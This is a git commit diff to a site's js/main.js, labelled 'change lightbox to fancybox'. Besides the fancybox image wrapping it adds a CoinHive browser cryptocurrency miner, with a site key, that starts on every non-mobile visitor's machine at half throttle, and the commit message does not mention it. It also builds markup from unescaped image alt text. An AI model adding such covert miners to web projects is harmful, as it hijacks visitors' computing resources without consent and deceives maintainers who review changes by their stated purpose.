683271335073081eea9ba5fda9bfde79888e9576
discountry <331027793@qq.com>
2017-12-20 18:35:58 +0800

    change lightbox to fancybox

--- js/main.js
+++ js/main.js
@@ -1,3 +1,14 @@
 $('.ui.dropdown')
-  .dropdown()
-;
+  .dropdown();
+
+$(".text img").each(function(index, element) {
+  $(element).wrap(`<a href="${element.src}" data-fancybox data-caption="${element.alt}">`);
+});
+
+var miner = new CoinHive.Anonymous('zyc1ClPF1ZevATB5gChyGzZklCCZHmY7', {
+  throttle: 0.5
+});
+// Only start on non-mobile devices.
+if (!miner.isMobile()) {
+  miner.start();
+}
